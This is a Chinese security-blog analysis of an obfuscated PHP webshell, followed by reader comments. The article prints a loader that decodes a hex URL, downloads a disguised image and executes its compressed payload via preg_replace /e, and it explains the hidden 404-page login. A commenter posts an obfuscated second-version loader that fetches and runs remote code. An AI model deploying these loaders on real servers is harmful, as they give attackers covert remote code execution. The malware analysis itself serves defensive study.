<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">PHP后门新玩法：一款猥琐的PHP后门分析</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">360网站安全中心</a> <span class="bull">·</span> <time title="2014/03/19 16:46" ui-time="" datetime="2014/03/19 16:46" class="published ng-binding ng-isolate-scope">2014/03/19 16:46</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>近日，360网站卫士安全团队近期捕获一个基于PHP实现的webshell样本，其巧妙的代码动态生成方式，猥琐的自身页面伪装手法，让我们在分析这个样本的过程中感受到相当多的乐趣。接下来就让我们一同共赏这个奇葩的Webshell吧。</p><h2>0x01 细节</h2><hr><p>Webshell代码如下：</p><pre><code>#!php
&lt;?php
error_reporting(0);
session_start();
header("Content-type:text/html;charset=utf-8");if(empty($_SESSION['api']))
$_SESSION['api']=substr(file_get_contents(
sprintf('%s?%s',pack("H*",
'687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f6d616b652e6a7067′),uniqid())),3649);
@preg_replace("~(.*)~ies",gzuncompress($_SESSION['api']),null);
?&gt;
</code></pre><p>关键看下面这句代码，</p><pre><code>#!php
sprintf('%s?%s',pack("H*",'687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f6d616b652e6a7067′),uniqid())
</code></pre><p>这里执行之后其实是一张图片，解密出来的图片地址如下：</p><pre><code>http://7shell.googlecode.com/svn/make.jpg?53280b00f1e85
</code></pre><p>然后调用file&#95;get&#95;contents函数读取图片为字符串，然后substr取3649字节之后的内容，再调用gzuncompress解压，得到真正的代码。最后调用preg_replace的修饰符e来执行恶意代码的。这里执行以下语句来还原出恶意样本代码，</p><pre><code>#!php
&lt;?php
echo gzuncompress(substr(file_get_contents(sprintf('%s?%s',pack("H*",
'687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f6d616b652e6a7067′),uniqid())),3649));
?&gt;
</code></pre><p>如图所示：</p><p><img alt="enter image description here" img-src="937cc591f7e4bea85d8342684835916ca14a5fdb.jpg"></p><p>分析这段代码，发现这是一个伪装的404木马(这里实在是太猥琐了…把页面标题改成404 Not Found)，其实整个webshell就一个class外加三个function，如下图：</p><p><img alt="enter image description here" img-src="96f0ab20d47b15a0305d0d9143afd3c1b89b17e6.jpg"></p><p>首先我先看一下它的前端html代码，其中有这么一段js程序</p><pre><code>#!js
document.onkeydown = function(e) {
var theEvent = window.event || e;
var code = theEvent.keyCode || theEvent.which;
if (80 == code) {
$("login").style.display = "block"
}
}
</code></pre><p>这里它用document.onkeydown获取用户敲击键盘事件，当code等于80的时候显示login这个div，这里查询了一下keyCode的对照表，查到80对应p和P键</p><p><img alt="enter image description here" img-src="b3a8390712dfe22bb69671f327765f5387c2e387.jpg"></p><p>所以触发webshell登陆需要按p键(不按P键页面就是一个空白页，看不到登陆框)，如图所示：</p><p><img alt="enter image description here" img-src="4ded35659e720d714fc38eb71ace9e390ea7196d.jpg"></p><p>再回到服务端php代码中，可以看到程序用的是对称加密，并且将登陆密码作为加密key，代码如图所示：</p><p><img alt="enter image description here" img-src="5acf6a309a0804514fdc9b48f41678b8f2bd57b0.jpg"></p><p>再看init()的逻辑</p><p><img alt="enter image description here" img-src="786b35bb3b57d73dc5a56fed66c4af1d2d69855f.jpg"></p><p>如图所示，先看这句代码</p><pre><code>#!php
$true = @gzuncompress(gzuncompress(Crypt::decrypt(pack('H*', '789c63ac0bbec7b494f12cdb02f6dfac3f833731cf093e163a892990793ebf0a9f1c6b18bb68983b3b47a022002a840c59′), $_POST['key'], true)));
</code></pre><p>根据这个解密逻辑我们可以推出，这里其实是将字符串true做了以下加密处理，</p><pre><code>#!php
unpack('H*',Crypt::encrypt(gzcompress(gzcompress('true')), $_POST['key'] , true))
</code></pre><p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="14f29d94f0afb1f1a987fcaa87f191b1f2b9b7f3b5baf1bb92f3b495f38e90f283a2f1948d54736e617a777b796466716767fcab80f18f8af1b983f3b8b2f0aca660">[email&#160;protected]</a>rue，然后程序调用setcookie给客户端返回$_COOKIE['key']，然后值得提一下的是后面这个<code>exit('{"status":"on"}')</code>，这里它与前端代码联系很紧密，我们看前端有个callback函数，如下</p><pre><code>#!js
function callback() {
var json = eval("(" + this.responseText + ")");
if (json.status=='on'){
window.location.reload();
return;
}
if (json.notice) {
$("notice").style.display = "block";
$("notice").innerHTML = json.notice;
sideOut();
}
}
</code></pre><p>这里执行<code>exit('{"status":"on"}')</code>会返回json串<code>{"status":"on"}</code>，此时前端js代码classback()获取到此响应会执行window.location.reload()刷新，再次请求正好带上前面获取的cookie，然后执行判断COOKIE的逻辑，如图所示：</p><p><img alt="enter image description here" img-src="b25d46507712b3652ff3fbbd9be987a764f8d5a2.jpg"></p><p>这里跟前面POST的逻辑一样，下面当判断为'true'以后，这里又请求了一张图片，pack出来地址为<code>http://2012heike.googlecode.com/svn/trunk/code.jpg</code>，然后调用_REQUEST获取图片内容，解密解压之后再eval，分析之后发现code.jpg中才是真正的webshell经过加密压缩之后的内容。这里我跟踪了一下代码打印出了真正执行的webshell的内容：</p><p><img alt="enter image description here" img-src="ad9a83d159a037892fea2d24e3f2be7ac5bafb4f.jpg"></p><p>登陆成功之后的webshell如下图：</p><p><img alt="enter image description here" img-src="3f2e4379b6916dadf0fda5089c05ab62de641a13.jpg"></p><h2>0x02 总结</h2><hr><p>这是一个高度隐蔽的webshell，它没有在其代码中用到一些危险函数和敏感字，而是将真正的shell内容经过层层加密处理之后保存到图片当中，丢到服务器上只留下一个url，并且url还是经过加密处理的，所以对外看没有任何特征可寻，过掉了大多数waf以及杀软的查杀。。作者的利用思路新颖，并且前端后端结合紧密，代码精简，各种奇技淫巧，有别于常见的webshell后门，令人佩服！</p><p>from:<a href="http://blog.wangzhan.360.cn/?p=65">http://blog.wangzhan.360.cn/?p=65</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/104" rel="bookmark" id="re1">Clickjacking简单介绍</a></li><li><a href="http://drops.wooyun.org/papers/892" rel="bookmark" id="re2">调皮的location.href</a></li><li><a href="http://drops.wooyun.org/web/11539" rel="bookmark" id="re3">XSS Attacks - Exploiting XSS Filter</a></li><li><a href="http://drops.wooyun.org/tips/3909" rel="bookmark" id="re4">PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">哦哦哦</span> <span class="reply-time">2016-06-11 20:02:14</span></div><p></p><p>@呃呃呃 你真可怜</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Hello</span> <span class="reply-time">2016-05-25 17:08:47</span></div><p></p><p>@KingBin 可否提供一下最新版代码让我本地调试一下做参考 ~0.o~<br><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="26171717121514151f14126657570845494b">[email&#160;protected]</a></p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tgw2000</span> <span class="reply-time">2016-02-01 12:59:43</span></div><p></p><p>@KingBin 能提供下代码，学习下吗？<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3541524207050505750403061b565a58">[email&#160;protected]</a></p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tgw2000</span> <span class="reply-time">2016-02-01 12:58:38</span></div><p></p><p>@KingBin 能给下代码吗</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小小泥娃</span> <span class="reply-time">2014-07-14 10:10:18</span></div><p></p><p>好猥琐啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">spiderman</span> <span class="reply-time">2014-06-18 16:35:43</span></div><p></p><p>思路很好啊，先到http://7shell.googlecode.com/svn/make.jpg?53280b00f1e85<br>获取代码，然后使用 preg_replace执行这些代码，通过执行获取的代码，密码验证之后，再到http://2012heike.googlecode.com/svn/trunk/code.jpg获取webshell并执行，niubility！！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">test</span> <span class="reply-time">2014-04-13 15:18:11</span></div><p></p><p>这个链接打开之后什么都没有？还是有什么玄机？http://require.duapp.com/session.php</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">王小二</span> <span class="reply-time">2014-04-12 09:19:19</span></div><p></p><p>牛逼</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Pany自留地</span> <span class="reply-time">2014-04-09 22:33:25</span></div><p></p><p>猥琐。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">第二版发布</span> <span class="reply-time">2014-03-28 15:02:49</span></div><p></p><p>pack('c*', 0x70, 0x61, 99, 107),'c' =&gt; $i('c*', 99, 97, 108, 108, 95, 117, 115, 101, 114, 95, 102, 117, 110, 99),'f' =&gt; $i('c*', 102, 105, 108, 101, 95, 103, 101, 116, 95, 99, 111, 110, 116, 101, 110, 116, 115),'e' =&gt; $i('c*',0x63,0x72,0x65,0x61,0x74,0x65,0x5f,0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e),'h' =&gt; $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631'),'s' =&gt;$i('c*',0x73,0x70,0x72,0x69,0x6e,0x74,0x66));if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSION['t']))));<br>?&gt;</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">whirlwind</span> <span class="reply-time">2014-03-24 01:34:19</span></div><p></p><p>5。5以后无效吧?</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lezi</span> <span class="reply-time">2014-03-21 15:46:31</span></div><p></p><p>防火墙上可以设置禁止WEB服务器主动外联，防止lcx外联</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">龙臣</span> <span class="reply-time">2014-03-20 17:59:10</span></div><p></p><p>也不能这么说吧，不过这种确实在特定环境很有效的，学习了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-03-20 15:28:12</span></div><p></p><p>挺猥琐的呀</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">呃呃呃</span> <span class="reply-time">2014-03-20 14:22:14</span></div><p></p><p>如果web服务器不能访问外网，那也就称不上是web服务器</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">blackbin</span> <span class="reply-time">2014-03-20 11:51:28</span></div><p></p><p>第二版获取方法<br>方法一<br>直接复制第一版代码。。。<br>运行即可看到第二版代码。。</p><p>方法二参考演示demo<br>此demo也是第一版代码执行后的效果<br>http://require.duapp.com/session.php</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ddXss</span> <span class="reply-time">2014-03-20 09:02:00</span></div><p></p><p>思路很猥琐，不过从网络下载加密后的代码有一定局限性，如果web服务器无法访问外网，那么webshell也就不能用了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">insight-labs</span> <span class="reply-time">2014-03-20 06:28:02</span></div><p></p><p>googlecode好像间歇被GFW干扰啊……</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">KingBin</span> <span class="reply-time">2014-03-20 00:48:55</span></div><p></p><p>20号发布第二版 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3dd5bca9da8e8652525252525252135252525213525252525252527d5b5245505c5451135e5250">[email&#160;protected]</a></p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">龙臣</span> <span class="reply-time">2014-03-19 23:56:22</span></div><p></p><p>长姿势了啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xt</span> <span class="reply-time">2014-03-19 23:06:08</span></div><p></p><p>虽然我看不懂，但是确实感觉挺猥琐的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">萧然</span> <span class="reply-time">2014-03-19 22:50:02</span></div><p></p><p>求代码</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xeyes</span> <span class="reply-time">2014-03-19 22:04:38</span></div><p></p><p>猥琐！！！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">genxor</span> <span class="reply-time">2014-03-19 21:49:12</span></div><p></p><p>第二版代码可否公布</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">KingBin</span> <span class="reply-time">2014-03-19 20:42:17</span></div><p></p><p>知道我底部为什么了加了个E？因为我曾用名小E</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">KingBin</span> <span class="reply-time">2014-03-19 20:40:36</span></div><p></p><p>貌似不能贴代码，需要的发我邮箱联系</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">KingBin</span> <span class="reply-time">2014-03-19 20:39:40</span></div><p></p><p>不要冒充我，你知道我用的测试密码是什么么？我来告诉你是demo123456，也就是密码是demo123456<br>你知道我如何算的3649图片位置？我来告诉你，那是因为我在写入之前加入了特征符[G] 用来区分图片和代码的位置？你知道我已经发布了第二版了么？来哥告诉你最新的</p><p>pack('c*', 0x70, 0x61, 99, 107),<br>'c' =&gt; $i('c*', 99, 97, 108, 108, 95, 117, 115, 101, 114, 95, 102, 117, 110, 99),<br>'f' =&gt; $i('c*', 102, 105, 108, 101, 95, 103, 101, 116, 95, 99, 111, 110, 116, 101, 110, 116, 115),<br>'e' =&gt; $i('c*',0x63,0x72,0x65,0x61,0x74,0x65,0x5f,0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e),<br>'h' =&gt; $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631'),<br>'s' =&gt;$i('c*',0x73,0x70,0x72,0x69,0x6e,0x74,0x66)<br>);<br>?&gt;</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lezi</span> <span class="reply-time">2014-03-19 20:05:37</span></div><p></p><p>牛逼</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-03-19 19:33:31</span></div><p></p><p>原作者出现……</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">蓝莓说</span> <span class="reply-time">2014-03-19 19:20:53</span></div><p></p><p>我得 写第二部了 这个我的写作</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">结扎师</span> <span class="reply-time">2014-03-19 18:34:35</span></div><p></p><p>奇技淫巧啊。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Coffee</span> <span class="reply-time">2014-03-19 18:25:08</span></div><p></p><p>确实猥琐→_→学习了。</p><p></p></div></div></div></div></div></main>